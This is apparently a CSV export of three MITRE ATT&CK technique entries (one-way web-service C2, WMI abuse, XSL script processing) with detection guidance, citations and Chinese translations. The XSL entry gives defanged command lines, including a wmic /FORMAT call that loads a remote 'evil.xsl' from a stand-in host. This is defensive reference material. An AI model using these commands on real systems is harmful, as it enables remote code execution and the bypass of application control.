T1102.003,Web Service: One-Way Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",https://attack.mitre.org/techniques/T1102/003,14 March 2020,26 March 2020,1.0,Command and Control,Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2),"Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1102,,,User,,,,,,"(Citation: FireEye APT29),(Citation: Fortinet Metamorfo Feb 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: Prevailion EvilNum May 2020),(Citation: F-Secure The Dukes),(Citation: Medium Metamorfo Apr 2020),(Citation: FireEye Periscope March 2018),",Web 服务：单向通信,攻击者可能会使用现有的合法外部 Web 服务作为向受感染系统发送命令的一种方式，而不会通过 Web 服务通道接收返回输出。受感染的系统可能会利用流行的网站和社交媒体来托管命令和控制 (C2) 指令。这些受感染的系统可能会选择通过不同的 C2 通道将这些命令的输出发送回，包括发送到另一个不同的 Web 服务。或者，在攻击者想要向系统发送指令并且不想要响应的情况下，受感染的系统可能根本不返回任何输出。作为 C2 机制的流行网站和社交媒体可能会提供大量掩护，因为网络中的主机可能在妥协之前已经与它们通信。使用通用服务，例如谷歌或推特提供的服务，可以让对手更容易隐藏在预期的噪音中。 Web 服务提供商通常使用 SSL/TLS 加密，为攻击者提供更高级别的保护。
T1047,Windows Management Instrumentation,"Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).(Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: MSDN WMI)(Citation: FireEye WMI 2015)

An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)",https://attack.mitre.org/techniques/T1047,31 May 2017,20 April 2022,1.2,Execution,"Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)",Windows,"Command: Command Execution, Network Traffic: Network Connection Creation, Process: Process Creation",False,,,@ionstorm,,1.0,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: FireEye APT32 May 2017),(Citation: FireEye Obfuscation June 2017),(Citation: Symantec Cicada November 2020),(Citation: FoxIT Wocao December 2019),(Citation: CME Github September 2018),(Citation: ESET Hermetic Wizard March 2022),(Citation: Impacket Tools),(Citation: Securelist Octopus Oct 2018),(Citation: Cofense Astaroth Sept 2018),(Citation: RATANKBA),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Kaspersky QakBot September 2021),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: GitHub PowerSploit May 2012),(Citation: Talos Olympic Destroyer 2018),(Citation: Group IB Ransomware September 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: TrendMicro Netwalker May 2020),(Citation: Talos Micropsia June 2017),(Citation: Cybereason Bazar July 2020),(Citation: Securelist BlackEnergy Feb 2015),(Citation: Novetta Blockbuster),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Unit 42 DarkHydrus July 2018),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Google EXOTIC LILY March 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: FireEye APT34 Dec 2017),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Unit 42 OilRig Sept 2018),(Citation: Carbon Black Emotet Apr 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Unit42 Sofacy Dec 2018),(Citation: Github PowerShell Empire),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Novetta Blockbuster RATs),(Citation: CERT-EE Gamaredon January 2021),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Hornet Security Avaddon June 2020),(Citation: McAfee Maze March 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: SecureWorks WannaCry Analysis),(Citation: Radware Micropsia July 2018),(Citation: Github AD-Pentest-Script),(Citation: Bromium Ursnif Mar 2017),(Citation: Github Koadic),(Citation: Unit 42 Kazuar May 2017),(Citation: CrowdStrike Grim Spider May 2019),(Citation: PowerSploit Documentation),(Citation: Cybereason Cobalt Kitty 2017),(Citation: eSentire FIN7 July 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: Cyphort EvilBunny Dec 2014),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Mandiant No Easy Breach),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Talos MuddyWater May 2019),(Citation: Microsoft 365 Defender Solorigate),(Citation: Cycraft Chimera April 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: DFIR Ryuk's Return October 2020),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Securelist Remexi Jan 2019),(Citation: Unit 42 Lucifer June 2020),(Citation: Securelist MuddyWater Oct 2018),(Citation: Group IB APT 41 June 2021),(Citation: FireEye WannaCry 2017),(Citation: Proofpoint TA505 Mar 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: Talos Nyetya June 2017),(Citation: FireEye MuddyWater Mar 2018),(Citation: Dragos EKANS),(Citation: Talos GravityRAT),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Prevailion EvilNum May 2020),(Citation: Kaspersky StoneDrill 2017),(Citation: GitHub PoshC2),(Citation: SentinelOne Valak June 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Symantec WastedLocker June 2020),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Alperovitch 2014),(Citation: DustySky),(Citation: US-CERT NotPetya 2017),(Citation: jRAT Symantec Aug 2018),(Citation: Lazarus RATANKBA),(Citation: RedCanary Mockingbird May 2020),(Citation: Talos Frankenstein June 2019),(Citation: Qualys LolZarus),(Citation: Cybereason Bumblebee August 2022),(Citation: Group IB Ransomware May 2020),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye FIN7 April 2017),(Citation: FireEye FiveHands April 2021),(Citation: FireEye APT41 Aug 2019),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Bitdefender FIN8 July 2021),(Citation: ClearSky MuddyWater Nov 2018),(Citation: cobaltstrike manual),(Citation: ClearSky Lazarus Aug 2020),(Citation: Sophos Maze VM September 2020),(Citation: Cybereason Molerats Dec 2020),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Bitdefender Naikon April 2021),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: LogRhythm WannaCry),(Citation: Dragos Crashoverride 2018),(Citation: NCC Group Chimera January 2021),(Citation: Juniper IcedID June 2020),(Citation: Check Point Meteor Aug 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Bitdefender Agent Tesla April 2020),(Citation: BlackBerry Bahamut),(Citation: Microsoft WDAC),(Citation: win10_asr),(Citation: FireEye WMI 2015)",Windows 管理规范（WMI）,攻击者可能会滥用 Windows Management Instrumentation (WMI) 来执行恶意命令和负载。 WMI 是一种管理功能，它提供了一个统一的环境来访问 Windows 系统组件。 WMI 服务支持本地和远程访问，尽管后者由 [Remote Services](https://attack.mitre.org/techniques/T1021) 提供便利，例如 [Distributed Component Object Model](https://attack. mitre.org/techniques/T1021/003) (DCOM) 和 [Windows 远程管理](https://attack.mitre.org/techniques/T1021/006) (WinRM)。（引用：MSDN WMI）基于 DCOM 的远程 WMI使用端口 135 运行，而 WinRM 上的 WMI 在使用 HTTP 时通过端口 5985 运行，而 HTTPS 使用 5986。（引文：MSDN WMI）（引文：FireEye WMI 2015）攻击者可以使用 WMI 与本地和远程系统交互，并将其用作一种执行各种行为的方法，例如为发现收集信息以及作为横向移动的一部分远程执行文件。 （引用：FireEye WMI SANS 2015）（引用：FireEye WMI 2015）
T1220,XSL Script Processing,"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

* <code>msxsl.exe customers[.]xml script[.]xsl</code>
* <code>msxsl.exe script[.]xsl script[.]xsl</code>
* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ ""Squiblydoo"" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>",https://attack.mitre.org/techniques/T1220,17 October 2018,05 May 2022,1.2,Defense Evasion,"Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.

The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.",Windows,"Module: Module Load, Process: Process Creation",False,,"Anti-virus, Application Control, Digital Certificate Validation",Avneet Singh; Casey Smith; Praetorian,,,Microsoft Core XML Services (MSXML) or access to wmic.exe,,,,"(Citation: ESET Lazarus Jun 2020),(Citation: Talos Cobalt Group July 2018),(Citation: PTSecurity Higaisa 2020),(Citation: Cybereason Astaroth Feb 2019),",XSL 脚本处理,攻击者可以通过在 XSL 文件中嵌入脚本来绕过应用程序控制并掩盖代码的执行。可扩展样式表语言 (XSL) 文件通常用于描述 XML 文件中数据的处理和呈现。为了支持复杂的操作，XSL 标准包括对各种语言的嵌入式脚本的支持。 （引用：Microsoft XSLT 脚本 2017 年 3 月）攻击者可能滥用此功能来执行任意文件，同时可能绕过应用程序控制。类似于 [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127)，可以安装和使用微软通用线路转换实用程序二进制文件 (msxsl.exe)（引用：Microsoft msxsl.exe）执行嵌入在本地或远程（URL 引用）XSL 文件中的恶意 JavaScript。 （引用：渗透测试实验室 MSXSL 2017 年 7 月）由于默认情况下未安装 msxsl.exe，因此攻击者可能需要将其与丢弃的文件打包在一起。 （引用：Reaqta MSXSL Spearphishing MAR 2018）Msxsl.exe 采用两个主要参数，一个 XML 源文件和一个 XSL 样式表。由于 XSL 文件是有效的 XML，因此攻击者可能会调用同一个 XSL 文件两次。使用 msxsl.exe 时，攻击者还可能为 XML/XSL 文件提供任意文件扩展名。（引用：XSL Bypass Mar 2019）命令行示例：（引用：渗透测试实验室 MSXSL 2017 年 7 月）（引用：XSL Bypass Mar 2019） * <code>msxsl.exe customers[.]xml script[.]xsl</code> * <code>msxsl.exe script[.]xsl script[.]xsl</code> * <code>msxsl.exe script[.]jpeg script[.]jpeg</code> 这种技术的另一种变体，称为“Squiblytwo”，涉及使用 [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) 调用 JScript 或XSL 文件中的 VBScript。（引用：LOLBAS Wmic）该技术还可以执行本地/远程脚本，并且类似于它的 [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/“Squumbledoo”对应的，利用受信任的内置 Windows 工具。攻击者可以滥用 [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) 中的任何别名，只要他们使用 /FORMAT 开关。（引文：XSL Bypass Mar 2019）命令行示例：（引文： XSL 绕过 2019 年 3 月）（引用：LOLBAS Wmic）* 本地文件：<code>wmic process list /FORMAT:evil[.]xsl</code> * 远程文件：<code>wmic os get /FORMAT:”https[: ]//example[.]com/evil[.]xsl”</code>
